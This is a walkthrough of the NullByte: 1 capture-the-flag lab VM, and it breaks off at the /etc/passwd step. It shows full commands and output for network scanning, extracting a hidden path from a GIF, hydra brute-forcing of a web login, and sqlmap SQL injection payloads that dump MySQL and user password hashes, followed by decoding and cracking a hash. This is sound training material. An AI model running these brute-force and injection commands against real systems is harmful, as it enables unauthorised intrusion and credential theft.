<p>Attacker: Kali Linux (<em>10.10.10.130/24</em>)</p>

<p>Target: NullByte: 1 (<em>10.10.10.134/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Found hidden information in picture and open the hidden path</li>
<li>Weak passwords used in Web login form, the password can be found by brute-force attacking</li>
<li>SQL injection vulnerability found in username searching page</li>
<li>Exploit SQL injection vulnerability to get user credentials, also can get a limited shell</li>
<li>Found user ramses with Base64 encoded MD5 password which can be cracked easily and SSH login as ramses</li>
<li>Mis-configuration program which has setuid set and did not use full path inside of system call. Exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirb</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Download picture from index.html and reveal the hidden information stored in it</li>
<li>Found the hidden folder and a login page which has comment saying that the password is simple</li>
<li>Use hydra with rockyou.txt to burte force crack the login password [<font color="FF8000">THC Hydra</font>]</li>
<li>The next username searching page is SQL injection vulnerable, exploit it to downlaod system sensitive file, login credentials and also get a limited shell [<font color="FF8000">sqlmap</font>]</li>
<li>Crack user ramses&rsquo;s password and ssh login to get a better shell</li>
<li>System enumeration and Exploit vulnerable program with setuid bit set to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://dirb.sourceforge.net/">dirb</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.134 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ sudo netdiscover -r 10.1.1.0/24
</span><span class='line'> Currently scanning: Finished!   |   Screen View: Unique Hosts&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p> 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;h2>   IP            At MAC Address      Count  Len   MAC Vendor                   &lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p> 10.1.1.1        00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                &lt;br/>
</span><span class='line'> 10.1.1.2        00:50:56:fd:d1:6b    01    060   VMWare, Inc.                                                                                                &lt;br/>
</span><span class='line'> 10.1.1.134      00:0c:29:e1:e0:98    01    060   VMware, Inc.                                                                                            &lt;br/>
</span><span class='line'> 10.1.1.254      00:50:56:ee:31:18    01    060   VMWare, Inc. &lt;br/></span></code></pre></td></tr></table></div></figure></p>

<p>10.10.10.134 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ sudo us -H -msf -Iv -p 1-65535 10.1.1.134
</span><span class='line'>listener statistics 147984 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open                http[   80]     from 10.1.1.134  ttl 64
</span><span class='line'>TCP open              sunrpc[  111]     from 10.1.1.134  ttl 64
</span><span class='line'>TCP open      multiling-http[  777]     from 10.1.1.134  ttl 64
</span><span class='line'>TCP open             unknown[32942]     from 10.1.1.134  ttl 64</span></code></pre></td></tr></table></div></figure></p>

<p>From the result above, TCP port 80, 111, 777 and 32942 have been discovered.</p>

<p>Then I run NMAP scan to probe more detail information for the four opening ports.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Nmap 6.49BETA4 scan initiated Mon Aug 17 07:06:13 2015 as: nmap -v -sV -O -A -T4 -p 80,111,777,32942 -oN NullByte_nmap.txt 10.1.1.134&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>Nmap scan report for 10.1.1.134
</span><span class='line'>Host is up (0.00044s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
</span><span class='line'>|&lt;em>http-methods: GET HEAD POST OPTIONS
</span><span class='line'>|&lt;/em>http-server-header: Apache/2.4.10 (Debian)
</span><span class='line'>|&lt;em>http-title: Null Byte 00 - level 1
</span><span class='line'>111/tcp   open  rpcbind 2-4 (RPC #100000)
</span><span class='line'>| rpcinfo:
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100024  1          32942/tcp  status
</span><span class='line'>|&lt;/em>  100024  1          47213/udp  status
</span><span class='line'>777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
</span><span class='line'>| ssh-hostkey:
</span><span class='line'>|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
</span><span class='line'>|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
</span><span class='line'>|_  256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
</span><span class='line'>32942/tcp open  status  1 (RPC #100024)
</span><span class='line'>MAC Address: 00:0C:29:E1:E0:98 (VMware)
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
</span><span class='line'>Uptime guess: 0.029 days (since Mon Aug 17 06:25:06 2015)
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>TCP Sequence Prediction: Difficulty=264 (Good luck!)
</span><span class='line'>IP ID Sequence Generation: All zeros
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.44 ms 10.1.1.134&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at &lt;a href="https://nmap.org/submit/">https://nmap.org/submit/&lt;/a> .&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Nmap done at Mon Aug 17 07:06:29 2015 &ndash; 1 IP address (1 host up) scanned in 16.18 seconds&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>I found that the port 777 is running SSH and apache 2.4.10 is running on port 80, and the server is Debian Linux with 3.x kernel.</p>

<p>Then I use <code>nikto</code> to scan if any known vulnerabilty can be found which will be a life saver.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Target IP:          10.1.1.134&lt;/li>
</span><span class='line'>&lt;li>Target Hostname:    10.1.1.134&lt;/li>
</span><span class='line'>&lt;li>Target Port:        80
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Start Time:         2015-08-17 07:01:56 (GMT-4)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Server: Apache/2.4.10 (Debian)&lt;/li>
</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /, fields: 0xc4 0x51c42a5c32a70&lt;/li>
</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
</span><span class='line'>&lt;li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li>
</span><span class='line'>&lt;li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type&lt;/li>
</span><span class='line'>&lt;li>No CGI Directories found (use &lsquo;-C all&rsquo; to force check all possible dirs)&lt;/li>
</span><span class='line'>&lt;li>Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.&lt;/li>
</span><span class='line'>&lt;li>Allowed HTTP Methods: GET, HEAD, POST, OPTIONS&lt;/li>
</span><span class='line'>&lt;li>Uncommon header &lsquo;x-ob_mode&rsquo; found, with contents: 0&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
</span><span class='line'>&lt;li>/phpmyadmin/: phpMyAdmin directory found&lt;/li>
</span><span class='line'>&lt;li>7668 requests: 0 error(s) and 9 item(s) reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>End Time:           2015-08-17 07:02:17 (GMT-4) (21 seconds)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>1 host(s) tested</span></code></pre></td></tr></table></div></figure></li>
</ul>


<p>Nothing too exciting, but found phpmyadmin installed and a folder <code>/phpmyadmin/</code>.</p>

<h3>Secret in the Pic</h3>

<p>Then I tried default password and some weak passwords with login phpmyadmin, but all failed.</p>

<p>Then I open iceweasel browser to have a close look at the website. There is only a picture with a sentence <code>If you search for the laws of harmony, you will find knowledge.</code></p>

<p>Nothing wrong about the sentence&hellip; but hint is hidden in the picture&hellip;</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte$ strings main.gif
</span><span class='line'>GIF89a
</span><span class='line'>P-): kzMb5nVYJw
</span><span class='line'>cccIII@@@GGG444999`&ldquo;&lt;&lt;&lt;
</span><span class='line'>ooo>>>EEE
</span><span class='line'>???^^^
</span><span class='line'>HHH;;;
</span><span class='line'>gggRRRJJJ+++
</span><span class='line'>TTTZZZ
</span><span class='line'>QQQ///
</span><span class='line'>~~~&rdquo;&lsquo;CCC
</span><span class='line'>   AAA
</span><span class='line'>aaa222
</span><span class='line'>&hellip; &hellip;</span></code></pre></td></tr></table></div></figure></p>

<p>Pay attention to the second line below the <code>GIF89a</code>:</p>

<p><code>P-): kzMb5nVYJw</code></p>

<p>Then I tried to use the string &lsquo;kzMb5nVYJw&rsquo; as an hidden folder and found the hidden login page:</p>

<p><img class="left" src="/downloads/nullbyte1/1.png"></p>

<p>From the source code, I noticed that this form is not connected to mysql and password is not complex&hellip; so here would be an online brute force attacking based on password-dict.</p>

<p>I use Hydra with rockyou.txt dictionary to brute force the login form and got the password: <code>elite</code>. (The parameter <code>-l admin</code> does not make any sense, just get rid of errors)</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte$ sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.1.1.134 http-post-form &ldquo;/kzMb5nVYJw/index.php:key=^PASS^:invalid&rdquo;
</span><span class='line'>[sudo] password for F4l13n:
</span><span class='line'>Hydra v8.1 &copy; 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) starting at 2015-08-17 09:20:13
</span><span class='line'>[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort&hellip;
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
</span><span class='line'>[DATA] attacking service http-post-form on port 80
</span><span class='line'>[80][http-post-form] host: 10.1.1.134   login: admin   password: elite
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) finished at 2015-08-17 09:20:57</span></code></pre></td></tr></table></div></figure></p>

<p>When I logged in with password <code>elite</code>, I have been forwarded to the following username searching page.</p>

<p><img class="left" src="/downloads/nullbyte1/2.png"></p>

<p>After tired several common SQLi test, I found SQL injection vulnerability exists in the parameter <code>usrtosearch</code>, the injection point is <code>http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=admin</code></p>

<p>Then I use SQLMAP to finish all the rest works:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u &ldquo;&lt;a href="http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*">http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*&lt;/a>&rdquo; &ndash;dbs
</span><span class='line'>&hellip; &hellip;
</span><span class='line'>[09:45:30] [WARNING] in OR boolean-based injections, please consider usage of switch &lsquo;&ndash;drop-set-cookie&rsquo; if you experience any problems during data retrieval
</span><span class='line'>URI parameter &lsquo;#1*&rsquo; is vulnerable. Do you want to keep testing the others (if any)? [y/N]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>sqlmap identified the following injection point(s) with a total of 151 HTTP(s) requests:&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p>Parameter: #1* (URI)
</span><span class='line'>    Type: boolean-based blind
</span><span class='line'>    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
</span><span class='line'>    Payload: &lt;a href="http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=-8162">http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=-8162&lt;/a>" OR 3808=3808#&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>Type: AND/OR time-based blind
</span><span class='line'>Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)
</span><span class='line'>Payload: http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=123" AND (SELECT * FROM (SELECT(SLEEP(5)))hjFz)#
</span><span class='line'>
</span><span class='line'>Type: UNION query
</span><span class='line'>Title: MySQL UNION query (NULL) - 3 columns
</span><span class='line'>Payload: http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=123" UNION ALL SELECT NULL,NULL,CONCAT(0x7170706271,0x6845736a5777725a736a,0x71706b7a71)#
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p>[09:45:32] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Debian
</span><span class='line'>web application technology: Apache 2.4.10
</span><span class='line'>back-end DBMS: MySQL 5.0.12
</span><span class='line'>[09:45:32] [INFO] fetching database names
</span><span class='line'>available databases [5]:
</span><span class='line'>[&lt;em>] information_schema
</span><span class='line'>[&lt;/em>] mysql
</span><span class='line'>[&lt;em>] performance_schema
</span><span class='line'>[&lt;/em>] phpmyadmin
</span><span class='line'>[*] seth&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[09:45:33] [INFO] fetched data logged to text files under &lsquo;/root/.sqlmap/output/10.1.1.134&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[*] shutting down at 09:45:33</span></code></pre></td></tr></table></div></figure></p>

<p>Checking the databases to grab passwords:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u &ldquo;&lt;a href="http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*">http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*&lt;/a>&rdquo; &ndash;batch &ndash;smart &ndash;dump -C User,Password,Host,Super_priv -T user -D mysql&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&hellip; &hellip;
</span><span class='line'>Database: mysql
</span><span class='line'>Table: user
</span><span class='line'>[6 entries]
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+
</span><span class='line'>| User             | Password                                              | Host      | Super_priv |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+
</span><span class='line'>| root             | &lt;em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | localhost | Y          |
</span><span class='line'>| root             | &lt;/em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | nullbyte  | Y          |
</span><span class='line'>| root             | &lt;em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | 127.0.0.1 | Y          |
</span><span class='line'>| root             | &lt;/em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | ::1       | Y          |
</span><span class='line'>| debian-sys-maint | &lt;em>BD9EDF51931EC5408154EBBB88AA01DA22B8A8DC             | localhost | Y          |
</span><span class='line'>| phpmyadmin       | &lt;/em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | localhost | N          |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[09:56:13] [WARNING] table &lsquo;mysql.&lt;code>user&lt;/code>&rsquo; dumped to CSV file &lsquo;/root/.sqlmap/output/10.1.1.134/dump/mysql/user-f3649c95.csv&rsquo;
</span><span class='line'>[09:56:13] [INFO] fetched data logged to text files under &lsquo;/root/.sqlmap/output/10.1.1.134&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[*] shutting down at 09:56:13</span></code></pre></td></tr></table></div></figure></p>

<p>Found mysql database login (this also can be used to login phpmyadmin): <code>root / sunnyvale</code></p>

<h3>Be ramses!</h3>

<p>There is another users table in database <code>seth</code>, which including the password hash of user <code>ramses</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u &ldquo;&lt;a href="http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*">http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*&lt;/a>&rdquo; &ndash;batch &ndash;smart &ndash;dump -T users -D seth
</span><span class='line'>&hellip; &hellip;
</span><span class='line'>[10:12:15] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Debian
</span><span class='line'>web application technology: Apache 2.4.10
</span><span class='line'>back-end DBMS: MySQL 5.0.12
</span><span class='line'>[10:12:15] [INFO] fetching columns &lsquo;position, user, id, pass&rsquo; for table &lsquo;users&rsquo; in database &lsquo;seth&rsquo;
</span><span class='line'>[10:12:15] [INFO] fetching entries of column(s) &lsquo;&lt;code>position&lt;/code>, &lt;code>user&lt;/code>, id, pass&rsquo; for table &lsquo;users&rsquo; in database &lsquo;seth&rsquo;
</span><span class='line'>[10:12:15] [INFO] analyzing table dump for possible password hashes
</span><span class='line'>Database: seth
</span><span class='line'>Table: users
</span><span class='line'>[2 entries]
</span><span class='line'>+&mdash;-+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
</span><span class='line'>| id | user   | position   | pass                                        |
</span><span class='line'>+&mdash;-+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
</span><span class='line'>| 1  | ramses | &lt;blank>    | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |
</span><span class='line'>| 2  | isis   | employee   | &ndash;not allowed&ndash;                             |
</span><span class='line'>+&mdash;-+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[10:12:15] [INFO] table &lsquo;seth.users&rsquo; dumped to CSV file &lsquo;/root/.sqlmap/output/10.1.1.134/dump/seth/users.csv&rsquo;
</span><span class='line'>[10:12:15] [INFO] fetched data logged to text files under &lsquo;/root/.sqlmap/output/10.1.1.134&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[*] shutting down at 10:12:15</span></code></pre></td></tr></table></div></figure></p>

<p>Found user login credentials: <code>ramses / YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE</code></p>

<p>Base64 decoded the encrypted password and got a MD5 hash: <code>c6d6bd7ebf806f43c76acc3681703b81</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ echo YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | base64 -d
</span><span class='line'>c6d6bd7ebf806f43c76acc3681703b81base64: invalid input</span></code></pre></td></tr></table></div></figure></p>

<p>Then crack the MD5 hash to get password in plaintext, which is <code>omega</code></p>

<p>Then downloading <code>/etc/passwd</code> for further enumeration.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
